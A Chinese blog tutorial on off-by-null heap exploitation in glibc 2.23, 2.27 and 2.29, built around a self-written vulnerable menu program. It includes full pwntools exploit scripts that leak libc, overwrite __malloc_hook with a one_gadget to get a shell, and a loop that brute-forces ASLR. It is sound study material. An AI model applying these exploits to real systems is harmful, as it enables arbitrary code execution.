# off by null利用总结


夏天的风，我永远记得，清清楚楚的说你爱我。		——《夏天的风》

<!--more-->

# 前言

off by null是堆块中十分容易出现的一种漏洞，在ctf中十分的常见。off by null漏洞就是堆块可以向下一个堆块溢出一个字节的数据，而该数据为\x00，这与溢出任意一个字节的数据是由区别的。如果是溢出任意一个字节，那么就可以修改下一个堆块的大小，而off by null则不能，它仅仅只可以将下一个堆块的inuse位置零，进而在free时发生堆块合并，进而overlapping来实现进一步的攻击。在堆块合并时，会进行unlink来取出要合并的chunk，所以想要利用off by null，我们还需要绕过unlink的保护。libc2.29中新增了对堆块合并的检测所以其利用机制和libc-2.27和libc-2.23有所区别，2.27与2.23基本没有太大的区别，只需要将tcache填满即可，不过里面依然有几点需要我们注意的，这将会在后面讲诉。

所以让我们先从2.23版本的libc讲起，再进入2.27，最后讲解最复杂的2.29。

# libc2.23的利用

首先我们来介绍一下2.23版本下off by null的利用方法，然后用一道例题实战巩固一下。

我们先分配四个堆块A，B，C，D，其大小分别是0x90，0x20，0x100，0x20。在堆中的排列如下。（ps：我们知道堆块size的最低3位有特殊意义，最低位代表pre_inuse，其值为1时代表上一个堆块正在使用，为0时代表上一个堆块未使用被free掉，而off by null正是利用这一点，将最低位的pre_inuse溢出为0进而发生堆块合并。

![image-20200706225142650](https://i.loli.net/2020/07/07/3yENTexV5nQPBlb.png)

A堆块的作用是构造满足unlink条件的堆块。当其释放时，将会放入unsortedbin堆块中，而unsorted bin堆块会给A堆块的fd，bk字段赋值为unsorted bin表头地址，进而可以通过验证。

B堆块的作用是利用off by null漏洞，修改下一个堆块的pre_inuse位为零。这里B堆块的大小可以根据需要来改变，当我们发生堆块合并后，B堆块将会被释放，进而就有了一个UAF漏洞可以利用。

C堆块的作用是发生堆块合并，使ABC三个堆块共同合并成一个堆块释放到bin中。当C堆块的pre_inuse位修改位零时，释放C堆块就会发生向前合并。注意因为off by null会修改C堆块size位的最低字节位零，所以C块的大小要向0x100对齐，如果是0x120的话，那么就会修改其大小为0x100，这样在堆块释放时将会发生错误。

D堆块的作用时防止合并后的堆块与Top chunk合并。

![image-20200707211635055](https://i.loli.net/2020/07/07/lO7InqR5mZ8hPeM.png)

我们现在来看看当我们释放C堆块时究竟发生了什么（如果对于libc的堆块管理不是很清楚的朋友，可以看一看我之前写过的[不同版本glibc的堆管理和新增保护机制](https://www.nopnoping.xyz/2020/05/19/不同版本glibc的堆管理和新增保护机制/))，这里我们只选择相关的关键部分讨论。）

当我们释放C堆块时，所以会检测其大小是否在fastbin堆块的范围内，如果不在且不是map分配的就会进行下面的安全检测。（以下代码来至libc2.23

````c
/* Lightweight tests: check whether the block is already the
       top block.  */
    if (__glibc_unlikely (p == av->top))
      malloc_printerr ("double free or corruption (top)");
    /* Or whether the next chunk is beyond the boundaries of the arena.  */
    if (__builtin_expect (contiguous (av)
			  && (char *) nextchunk
			  >= ((char *) av->top + chunksize(av->top)), 0))
	malloc_printerr ("double free or corruption (out)");
    /* Or whether the block is actually not marked used.  */
    if (__glibc_unlikely (!prev_inuse(nextchunk)))
      malloc_printerr ("double free or corruption (!prev)");

    nextsize = chunksize(nextchunk);
    if (__builtin_expect (chunksize_nomask (nextchunk) <= 2 * SIZE_SZ, 0)
	|| __builtin_expect (nextsize >= av->system_mem, 0))
      malloc_printerr ("free(): invalid next size (normal)");
````

第一个if检测当前要释放的堆块是否等于TOPchunk。

第二个if检测下一个chunk是否在堆块地址范围内。

第三个if检测下一个chunk的pre_inuse位是否为1。

第四个if检测下一个chunk的大小是否满足要求。

Obviously，我们构造的堆块C满足上面的四个条件。（如果C的地址不是0x100对齐的话，那么2，3，4检测都可能出错）。

ok，通过上面的检测后，下面就来到我们讨论的重点了。

```c
/* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }
```

首先检测堆块的prev_inuse位，如果prev_inuse位为零的话就会向后合并。那么究竟要向后合并多少字节的堆块呢？这个由prevsize位给出。根据prevsize位的大小，计算出待合并的chunk，将该chunk从双向链表中unlink出来，然后与该堆块合并构成一个新的堆块。

所以如果我们修改prev_inuse位，并且修改后计算出来的待合并chunk满足unlink的条件的话，我们就可以实现堆块的overlapping。

根据这个思路，我们修改C堆块的prev_inuse位为0xB0，那么在堆块合并时，根据prev_inuse位我们计算出待合并的堆块地是A，合并后的size大小是0x150，这样只要A堆块满足unlink的条件，我们就完成了ABC堆块的合并，进而可以利用UAF漏洞。这里我们再大致看一看unlink的内容。

````c
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
    FD = P->fd;								      \
    BK = P->bk;								      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr ("corrupted double-linked list");			      \
    else {								      \
        FD->bk = BK;							      \
        BK->fd = FD;							      \
        if (!in_smallbin_range (chunksize_nomask (P))			      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      \
	    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      \
		|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
	      malloc_printerr ("corrupted double-linked list (not small)");   \
            if (FD->fd_nextsize == NULL) {				      \
                if (P->fd_nextsize == P)				      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;		      \
                else {							      \
                    FD->fd_nextsize = P->fd_nextsize;			      \
                    FD->bk_nextsize = P->bk_nextsize;			      \
                    P->fd_nextsize->bk_nextsize = FD;			      \
                    P->bk_nextsize->fd_nextsize = FD;			      \
                  }							      \
              } else {							      \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
              }								      \
          }								      \
      }									      \
}
````

unlink首先会检擦该chunk的prev_size与size位是否匹配，然后就是我们熟悉的双向链表检验过程。显然，A堆块是我们正常释放的堆块，且其在unsorted bin堆块中，所以这些检查都能通过。

ok，关于libc-2.23的利用原理介绍到这里就告一段落了，这里概括一下攻击步骤。

+ 分配ABCD，四个堆块。
+ 释放A堆块放入unsortedbin中。
+ 利用B堆块修改C堆块的prev_size大小和prev_inuse位。
+ 释放C堆块。

下面我们就用一道例题来帮助大家理解，活学活用。

## 例题

这里我就不在网上去找例题了，我们现写一道简单的有off by null漏洞的菜单题来运用刚才学到的知识。

````c
#include<stdio.h>
struct chunk{
	long *point;
	unsigned int size;
}chunks[10];
void add()
{
	unsigned int index=0;
	unsigned int size=0;
	puts("Index?");
	scanf("%d",&index);
	if(index>=10)
	{
		puts("wrong index!");
		exit(0);
	}
	puts("Size?");
	scanf("%d",&size);
	chunks[index].point=malloc(size);
	if(!chunks[index].point)
	{
		puts("malloc error!");
		exit(0);
	}
	chunks[index].size=size;
}
void show()
{
	unsigned int index=0;
	puts("Index?");
	scanf("%d",&index);
	if(index>=10)
	{
		puts("wrong index!");
		exit(0);
	}
	if(!chunks[index].point)
	{
		puts("It's blank!");
		exit(0);
	}
	puts(chunks[index].point);
}
void edit()
{
	unsigned int index;
	puts("Index?");
	scanf("%d",&index);
	if(index>=10)
	{
		puts("wrong index!");
		exit(0);
	}
	if(!chunks[index].point)
	{
		puts("It's blank!");
		exit(0);
	}
	char *p=chunks[index].point;
	puts("content:");
	p[read(0,chunks[index].point,chunks[index].size)]=0;
}
void delete()
{
	unsigned int index;
	puts("Index?");
	scanf("%d",&index);
	if(index>=10)
	{
		puts("wrong index!");
		exit(0);
	}
	if(!chunks[index].point)
	{
		puts("It's blank!");
		exit(0);
	}
	free(chunks[index].point);
	chunks[index].point=0;
	chunks[index].size=0;
}
void menu()
{
	puts("1) add a chunk");
	puts("2) show content");
	puts("3) edit a chunk");
	puts("4) delete a chunk");
	putchar('>');
}
void main()
{
	unsigned int choice;
	puts("Welcome to my off by null vuln vulnerability exercise.");
	puts("wish you will play happy!");
	while(1)
	{
		menu();
		scanf("%d",&choice);
		switch(choice)
		{
			case 1:
				add();
				break;
			case 2:
				show();
				break;
			case 3:
				edit();
				break;
			case 4:
				delete();
				break;
			default:
				exit(0);
		}
	}

}
````

在edit函数出p[read(0,chunks[index].point,chunks[index].size)]=0;这句语句造成了off by null漏洞。本意是想将输入的最后一个字符替换成0，但是read函数返回的是读入的字符数，而数组是从0开始标记的，所以如果我们读入了size个字符那么就会修改第size+1处的值为0。

我们用gcc -fPIE -pie -z now -o vuln off_by_one.c来开启全部保护。OK现在我们就开始写EXP了，按照我们上面介绍的利用思路，我们需要分配ABCD四个堆块，这里为了配合之后的fast bin attack，我们将B堆块的大小修改为0x70。

````python
add(0,0x80) #A,0
add(1,0x68)	#B,1
add(2,0xf0)	#C,2
add(3,0x10) #D,3
````

![image-20200708222818883](https://i.loli.net/2020/07/13/P2Lqb1CUwkxr5mu.png)

![image-20200708222923747](https://i.loli.net/2020/07/13/MvJZ8dnycYWbVPQ.png)

图中表明了ABC三个堆块在堆中的相对位置，这里就不标记D了，因为D堆块只是起一个防止堆块和TOP chunk合并的作用，在漏洞利用时没有用处。

OK我们继续之前分析的步骤，释放A堆块，并修改C堆块的prev_size和prev_inuse位，我们计算一下可以得到prev_size=0x70+0x90=0x100。

![image-20200708223415370](https://i.loli.net/2020/07/13/Uk9nfaL1EHpXzxu.png)

A堆块被释放到了unsorted bin中，由图中红笔画出的两个地方，刚好可以bypass unlink的检验，下面我们再来看看C堆块的prev_size和prev_inuse位。

![image-20200708224018145](https://i.loli.net/2020/07/13/nWAubjclxyZTKBI.png)

从图中可以看出，我们成功的将C堆块的prev_size和rev_inuse修改为我们想要的值，接下来让我们free掉C堆块，看看会发生什么。

![image-20200708224637108](https://i.loli.net/2020/07/13/G1frQL9iKbqu6V5.png)

可以看到C堆块和前面的堆块发生合并生产了一个0x200大小的chunk，而B堆块被包含在其中，这个时候我们就实现了堆块overlapping。OK，off by null的漏洞我们以及利用成功了，接下来就是泄漏libc地址，然后进行fast bin attack袭击malloc_hook

接下来的步骤我就直接阐述了，因为这不涉及off by null了。

+ 首先我们分配0x80大小的chunk这样，将会分割0x200的堆块，然后unsorted bin的地址就会放在我们B对堆块上。
+ 然后显示B堆块的内容，我们就获得了libc的地址
+ 然后再添加0x68大小的chunk，这样我们就拥有两个Bchunk，随后就可以展开fast bin attack。
+ 我们再释放掉其中一个B堆块
+ 再用另外一个堆块修改fd的值为malloc_hook-0x23
+ 最后修改malloc_hook为realloc，realloc_hook为onegadget从而获得shell

下面是EXP

````python
#Author: Nopnoping
from pwn import *
from LibcSearcher import *
if args['REMOTE']:
	sh=remote()
else:
	sh=process('./vuln')

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'
s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
gdba	= lambda command=''			:gdb.attach(sh,command)

def choice(elect):
	sh.recvuntil('>')
	sh.sendline(str(elect))

def add(index,size):
	choice(1)
	sh.recvuntil('?')
	sh.sendline(str(index))
	sh.recvuntil('?')
	sh.sendline(str(size))

def edit(index,content,full=False):
	choice(3)
	sh.recvuntil('?')
	sh.sendline(str(index))
	sh.recvuntil(':')
	if full:
		s(content)
	else:
		sh.sendline(content)

def show(index):
	choice(2)
	sh.recvuntil('?')
	sh.sendline(str(index))

def delete(index):
	choice(4)
	sh.recvuntil('?')
	sh.sendline(str(index))

libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
add(0,0x80) #A,0
add(1,0x68)	#B,1
add(2,0xf0)	#C,2
add(3,0x10) #D,3
delete(0)
edit(1,'\x00'*0x60+p64(0x100),full=True)
delete(2)

add(4,0x80)
show(1)
ru('\n')
libc_base=u64(ru('\n').replace('\n','').ljust(8,'\x00'))-0x3c4b78
malloc_hook=libc_base+libc.symbols['__malloc_hook']
realloc=libc_base+libc.symbols['realloc']
gadget=[0x4527a,0xf0364,0xf1207]
onegadget=libc_base+gadget[2]
info_addr('libc_base',libc_base)
info_addr("malloc_hook",malloc_hook)
info_addr("onegadget",onegadget)
add(2,0x68)
delete(2)
edit(1,p64(malloc_hook-0x23))
add(5,0x68)
add(6,0x68)
edit(6,'\x00'*0xb+p64(onegadget)+p64(realloc+8))
add(1,0x10)
sh.interactive()
````

# libc2.27的利用

libc2.27的利用和libc2.23基本思路是一样的，只不过我们需要多一步填满tcache的操作。这里还是用2.23里面的ABCD四个堆块解释。

![image-20200706225142650](https://i.loli.net/2020/07/07/3yENTexV5nQPBlb.png)

我们的A堆块需要释放到unsorted bin中，如果0x90大小的tcache没有填满的话，其会释放到他cache中，而无法绕过unlink检验。

C堆块的tcache如果不填满的话，当我们释放C堆块时，其也会直接放入tcache中，而不会发生向后合并的操作。

因此根据上面的分析，我们需要将0x90和0x100的tcache提前填充满。

这里还有一点需要注意，在2.27中我们可以使用tcache_poisoning来达到任意地址分配，因此我们的B堆块不需要像在2.23中构造成0x70。OK这里综述一下利用思路。

+ 填满0x90和0xf0堆块
+ 申请ABCD四个堆块
+ 释放A堆块
+ 利用B堆块修改C堆块的的prev_size和prev_inuse位
+ 释放C堆块

OK，off by null我们就实施成功了，实现了chunk overlapping，后面的任意地址分配就需要利用tcache_poisoning了。

## 例题

我们还是利用2.23的程序来练习2.27版本下的利用。这里因为我是在ubuntu16系统下运行的程序，其默认版本是libc2.23，因此我需要更改一下程序的libc版本。需要用到的工具是patchelf，在这篇博客我有对这个工具详细的一个介绍。修改程序为指定libc版本 & pwndbg安装。如果用的是ubuntu18的朋友可以直接跳到EXP编写的部分。

我们先用ldd看一下这个程序的libc和ld。

![image-20200710215557835](https://i.loli.net/2020/07/13/pRlqhC7UifOjEwB.png)

可以看到程序的libc版本和ld依赖的文件，我们现在利用patchelf工具将其修改为2.27的libc和ld。

````bash
$ patchelf --replace-needed  libc.so.6 /glibc/2.27/amd64/lib/libc-2.27.so vuln
$ patchelf --set-interpreter /glibc/2.27/amd64/lib/ld-2.27.so ./vuln
$ ldd ldd vuln
	linux-vdso.so.1 =>  (0x00007ffd38345000)
	/glibc/2.27/amd64/lib/libc-2.27.so (0x00007fcf76185000)
	/glibc/2.27/amd64/lib/ld-2.27.so => /lib64/ld-linux-x86-64.so.2 (0x00007fcf7673d000)
````

用patchelf工具修改后，我们再次用ldd查看程序，libc和ld成功被我们修改为2.27。

OK现在我们可以开始编，写我们的EXP了。按照前面分析的思路，我们首先需要将0x90和0x1b0两个堆块填满。当tcache被填满后再申请堆块的话，将会从tcahe里面分配，这样分配到的ABC可能并不连续，所以我们先提前将ABC三个堆块分配好，再填满0x90和0x1b。因为又tcache来分隔C堆块和TOP chunk，所以这里我们就不需要D堆块了。

````python
add(0,0x80) #A
add(1,0x18) #B
add(2,0xf0) #C
for i in range(7):
	add(i+3,0x80)

for i in range(7):
	delete(i+3)
	add(i+3,0xf0)

for i in range(7):
	delete(i+3)
````

![image-20200710222930514](https://i.loli.net/2020/07/13/21fJQHeuDh4OFkp.png)

现在让我们来释放A堆块，并用B堆块修改C堆块的大小。

![image-20200710222226781](https://i.loli.net/2020/07/13/icVR317DIUMoLk2.png)

接下来我们释放C堆块，然后C堆块将会和AB堆块发生合并。（这里的检测机制和2.23一样我就不赘述了）

![image-20200710222949822](https://i.loli.net/2020/07/13/aA7lFghpjXPLGKN.png)

OK成功合并，off by null漏洞利用成功，接下来的就是获取Shell了，思路和2.23一样。

+ 分配0x80大小堆块，将unsorted bin的地址放入B堆块中。（这里需要先将tcache中的堆块分配完）
+ 泄漏libc地址
+ 再分配0x20大小堆块，从而有两个B堆块
+ 释放其中一个修改fd为realloc_hook
+ 修改malloc_hook为realloc，realloc_hook为onegadget从而获得shell

```python
from pwn import *
from LibcSearcher import *
if args['REMOTE']:
	sh=remote()
else:
	sh=process('./vuln')

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'
s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
gdba	= lambda command=''			:gdb.attach(sh,command)

def choice(elect):
	sh.recvuntil('>')
	sh.sendline(str(elect))

def add(index,size):
	choice(1)
	sh.recvuntil('?')
	sh.sendline(str(index))
	sh.recvuntil('?')
	sh.sendline(str(size))

def edit(index,content,full=False):
	choice(3)
	sh.recvuntil('?')
	sh.sendline(str(index))
	sh.recvuntil(':')
	if full:
		s(content)
	else:
		sh.sendline(content)

def show(index):
	choice(2)
	sh.recvuntil('?')
	sh.sendline(str(index))

def delete(index):
	choice(4)
	sh.recvuntil('?')
	sh.sendline(str(index))

libc=ELF('/glibc/2.27/amd64/lib/libc-2.27.so')
add(0,0x80) #A
add(1,0x18) #B
add(2,0xf0) #C
for i in range(7):
	add(i+3,0x80)

for i in range(7):
	delete(i+3)
	add(i+3,0xf0)

for i in range(7):
	delete(i+3)
delete(0)
edit(1,'\x00'*0x10+p64(0xb0),full=True)
delete(2)
for i in range(8):
	add(3,0x80)
show(1)
ru('\n')
libc_base=u64(ru('\n').replace('\n','').ljust(8,'\x00'))-0x3afca0
malloc_hook=libc_base+libc.symbols['__malloc_hook']
realloc=libc_base+libc.symbols['realloc']
gadget=[0x41666,0xdeed2]
onegadget=libc_base+gadget[1]
info_addr('libc_base',libc_base)
info_addr("malloc_hook",malloc_hook)
info_addr("onegadget",onegadget)
add(2,0x10)
delete(2)
edit(1,p64(malloc_hook-0x8))
add(3,0x10)
add(4,0x18)
edit(4,p64(onegadget)+p64(realloc+2))
add(1,0x10)
sh.interactive()
```

# libc2.29的利用

在libc2.29中，对向前合并操作，增加了保护机制。究竟是什么保护呢，我们一起来看看libc2.29的源代码。

````c
    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating");
      unlink_chunk (av, p);
    }
````

相对于2.27和2.23版本的libc，2.29版本增加了一条if判断。其会检测prev_size和p堆块的size是否相等。p堆块是什么堆块呢？是根据prevsize的值而计算出来的上一个堆块。用我们上面举的ABCD堆块的例子来说，这里的p堆块就是A堆块，而A堆块的size值是0x90，很明显和我们将要修改的prevsize值是不相等的，prevsize的值是A+B。所以如果按照2.23和2.27的做法来做的话，将不能绕过这个检验。

那我们应该怎么做？我们之前绕过利用了unsorted bin留下的数据，同样2.29的off by null也是充分利用bin留下的数据来操控的。具体利用了large bin，small bin，fast bin。

接下来，我们先总体看一看利用思路，再分析思路原理和一些细节。

1. 将heap的地址第二字节大小提高到0x00
2. 分配一个很大的chunk，这个chunk的大小要在largebin范围内并且大于tcache的最大值。（我们将这个chunk命名为A）
3. 释放A堆块，再分配一个大于A堆块大小的堆块，使A堆块进入large bin中。
4. 从A堆块中分割出一个堆块B，修改B堆块的bk和fd_size
5. 再从A堆块中分配两个相同大小且在fast bin大小范围内的C，D
6. 释放C，D，申请一个大于剩余A堆块大小的chunk，使C，D进入small bin中
7. 申请C堆块，构造bk
8. 申请D堆块，然后释放B，D堆块，将B，D放入fast bin中。
9. 申请B堆块修改fd。
10. 最后，从A堆块中分隔E，F，用E修改F的prev_size和prev_inuse位
11. 释放F堆块，完成向前合并（B，C，D，E）

第一步中，为什么要将第二字节提高到0x00，我们先放到后面再来讲，我们先默认A堆块的地址第二个字节为0x00。

第二步和第三步使A堆块放入了large bin中，我们知道large bin和其他堆块最大的区别在于多了一个size的双向链表，而当large bin中就这一个堆块时，fd_size和bk_size的值就是该堆块自己的地址。我们假设这里分配的A堆块是0x500。下图是A堆块释放到large bin中后，堆块中的数据。

![image-20200712215616559](https://i.loli.net/2020/07/13/z8Qm1h3gsXLJI7W.png)

第四步，我们从A堆块中分隔B堆块，这里我们分隔0x30大小的堆块B，堆块B将会残留A堆块中的数据，所以其依然会保留上图中的fd，bk，fd_size，bk_size。这里我们需要将bk修改为我们堆块合并后的size，究竟是多少呢？我们现在还不知道，所以就暂时用consolidate_size代替。为了便于标记各个堆块，我们这里在size前面加上堆块的字母。

![](https://i.loli.net/2020/07/13/l9NtyK3xfFUIcXD.png)

第五步，我们分配两个相同大小的chunkC，D，这里我们就分配0x30大小的chunk。

![](https://i.loli.net/2020/07/13/wUReunSz7so8YIM.png)

第六步我们释放了C和D并申请一个大的堆块，使得C和D进入small bin中。注意这里先释放D再释放C，这样C堆块的bk将会是D堆块的地址，我们用addr of D来表示。

![](https://i.loli.net/2020/07/13/zxRADHLUETGes87.png)

由于D堆块的地址和B堆块的地址相近，因此在第七步中我们申请C堆块并将其bk的值修改为B堆块的地址加0x10。

![](https://i.loli.net/2020/07/13/Qpmbu2oHzUh1iKg.png)

第八步中，我们释放B，D堆块，并将其放入fast bin中，此时B堆块的fd指向D堆块。

![](https://i.loli.net/2020/07/13/a3U8p2zV1SMGIEc.png)

第九步中，我们将申请的B堆块的fd修改为B堆块+0x10，并且fd_size修改为C堆块的地址（这一步在第三步也可以完成）。

![](https://i.loli.net/2020/07/13/OBNA4QxjadTKIVG.png)

现在我们已经构造出一个可以绕过unlink和新增的size检验的对堆块了。该堆块就是B+0x10，其size是我们可以修改的consolidate，若将其修改为prev_size的大小，那么我们就能绕过新增的检测，并且其fd和bk也能绕过unlink检验。我们画一画箭头就能更清晰的知道为什么能绕过unlink了。

![image-20200712222231789](https://i.loli.net/2020/07/13/D9MsYPdK8wHtvRI.png)

fd指向C堆块，而C堆块的bk刚好也是只想B+0x10的。

bk是之前large bin留下来的值，其指向的是B堆块，而B堆块的fd同样是B+0x10。

剩下的几个步骤就和2.23，2.29相似了。

![](https://i.loli.net/2020/07/13/oxrdOJ3a4zIUXCY.png)

此时我们分配E：0x20，F：0x100，计算一下就能得到B+0x10到F的堆块大小为0xa，现在释放F堆块就会发生堆块合并，从而造成overlapping。之后的利用就很简单了。

OK，现在我们在回到最开头的那个问题。为什么要将heap的地址第二个字节提到到0x20?这是因为off by null会在输入的字符后面加0x00，比如我们在修改B堆块的fd为B+0x10时，我们修改了最低字节，但是由于off by null，其第二字节也被修改为0x00，所以只有当我们将第二个字节提高到0x00时才能成功修改。

在将地址提高到第二字节为0x00时，如果开启了PIE时，最低的12位是确定的，13-16位是不确定的，因此只能爆破，成功率是1/16。在本地测试时可以先将PIE关闭，当编写出EXP后，再开启PIE，测试爆破。

## 例题

例题还是用前面的例子，不过我们需要用patchelf将libc和ld的版本换成2.29的，方法同2.27。

````bash
$ patchelf --replace-needed /glibc/2.27/amd64/lib/libc-2.27.so /glibc/2.29/amd64/lib/libc-2.29.so ./vuln
$ patchelf --set-interpreter /glibc/2.29/amd64/lib/ld-2.29.so ./vuln
$ ldd vuln 
	linux-vdso.so.1 =>  (0x00007fff2afe1000)
	/glibc/2.29/amd64/lib/libc-2.29.so (0x00007f6c8ff74000)
	/glibc/2.29/amd64/lib/ld-2.29.so => /lib64/ld-linux-x86-64.so.2 (0x00007f6c90530000)

````

按照我们的思路首先我们需要将地址提高到第二字节为0。我们这里先关闭ASLR来编写EXP。

gdb观察到，第一个分配的堆块地址是0x555555758670，所以如果我们想要将堆块地址提高到0x555555760000，我们需要添加0x7990大小的chunk。这里从0x7990中拿出来7个0x30大小的chunk，用于后面填满tcache。

然后我们分配一个0x500大小的chunkA，并分配一个0x20大小的chunk来分隔A和TOPchunk。A堆块分配完成后，我们再释放A，申请一个比A大的chunk，这里我们申请0x600来使A堆块进入large bin。

![image-20200713203531506](https://i.loli.net/2020/07/13/cuvBZa2MLKYmOSy.png)

按照上面的思路，我们再从A堆块中分隔出BCD堆块，注意在实际应用中C，D，A堆块不能相邻，否在在申请一个较大堆块时，发生malloc_consolidate，CDA将会合并

![](https://i.loli.net/2020/07/13/BOfJClnNtxwDyXK.png)

这里把B堆块的bk和fd_size改成consolidate_size和C堆块的地址。consolidate_size是根据后面需要合并的堆块大小计算出来的，在这里可以先不写出，待后面分配完了后再修改。

然后我们用前面准备的7个0x30大小的chunk填满tcache，再释放C和D，并申请一个大的chunk使得C和D进入small bin。注意这里为了防止D堆块和A堆块合并，我们在申请一个大的对快前，提前将E堆块申请了。

![image-20200713205519924](https://i.loli.net/2020/07/13/nJQSpx5X7Ih4MoL.png)

然后我们申请出C堆块，将bk修改为B+0x10.

![](https://i.loli.net/2020/07/13/KgIAFCrn8aEWXoJ.png)

下一步我们将B堆块和D堆块放入fast bin中然后修改B堆块的fd为B+0x10

![](https://i.loli.net/2020/07/13/s9kMcGhr2P14HEI.png)

到这里我们就完成了堆块的构造，后面就很简单了，我们再从A堆块中分割出E和F，然后用E来修改F的prev_size和in_use。

![image-20200713210657235](https://i.loli.net/2020/07/13/FWi8CUIBwnbm42J.png)

接下来我们需要先申请7个0x100大小的chunk，来填满tcache，再释放F堆块发生堆块合并。

![image-20200713211401464](https://i.loli.net/2020/07/13/NpEDGdAejMaybU4.png)

发生堆块合并后，思路就和前面一样了，这里就不再重复了，直接看EXP。

````python
from pwn import *
from LibcSearcher import *
if args['REMOTE']:
	sh=remote()
else:
	sh=process('./vuln')

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'
s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

def choice(elect):
	sh.recvuntil('>')
	sh.sendline(str(elect))

def add(index,size):
	choice(1)
	sh.recvuntil('?')
	sh.sendline(str(index))
	sh.recvuntil('?')
	sh.sendline(str(size))

def edit(index,content,full=False):
	choice(3)
	sh.recvuntil('?')
	sh.sendline(str(index))
	sh.recvuntil(':')
	if full:
		s(content)
	else:
		sh.sendline(content)
libc=ELF('/glibc/2.29/amd64/lib/libc-2.29.so')
def show(index):
	choice(2)
	sh.recvuntil('?')
	sh.sendline(str(index))

def delete(index):
	choice(4)
	sh.recvuntil('?')
	sh.sendline(str(index))
#1 step
for i in range(7):
	add(i,0x20)
add(7,0x7830)
#2 step
add(7,0x4f0) #A
add(8,0x10)
#3 step
delete(7)
add(8,0x5f0)
#4 and 5 step 
for i in range(3):
	add(7+i,0x20) 
add(9,0x20)
edit(7,p64(0)+p64(0xf1)+'\x30',full=True)  #B
#6 step
for i in range(7):
	delete(i)
add(0,0x10)
delete(9)
delete(8)
add(0,0x500)
#7 step
for i in range(7):
	add(i,0x20)
add(8,0x20)
add(9,0x20)
edit(8,p64(0)+'\x10',full=True)
#8 step
for i in range(7):
	delete(i)
delete(9)
delete(7)
#9 step
for i in range(7):
	add(i,0x20)
add(7,0x20)
add(9,0x20)
edit(7,'\x10',full=True)
add(1,0x18)
add(0,0xf0)
edit(1,p64(0)*2+p64(0xf0),full=True)
#10 step
for i in range(7):
	add(i+1,0xf0)
for i in range(7):
	delete(i+1)
#11 step
delete(0)
#get shell
add(0,0x10)
show(8)
ru('\n')
libc_base=u64(ru('\n').replace('\n','').ljust(8,'\x00'))-0x3b3ca0
malloc_hook=libc_base+libc.symbols['__malloc_hook']
realloc=libc_base+libc.symbols['realloc']
onegadget=libc_base+0xdf202
info_addr("libc_base",libc_base)
info_addr("malloc_hook",malloc_hook)
info_addr("onegadget",onegadget)
add(1,0x20)
delete(8)
edit(1,p64(malloc_hook-0x8))
add(0,0x20)
add(1,0x20)
edit(1,p64(onegadget)+p64(realloc+2))
add(1,0x20)
itr()
````

注意这里heap地址的第13-16位是随机的，所以如果开启了ASLR那么就需要爆破，那么就需要写一个bash脚本。

````bash
for i in `seq 1 100`
do
        python exp.py
done
````

# REF

[linux程序保护机制&gcc编译选项](https://www.jianshu.com/p/91fae054f922)

[glibc2.29下的off-by-null](https://bbs.pediy.com/thread-257901.htm)
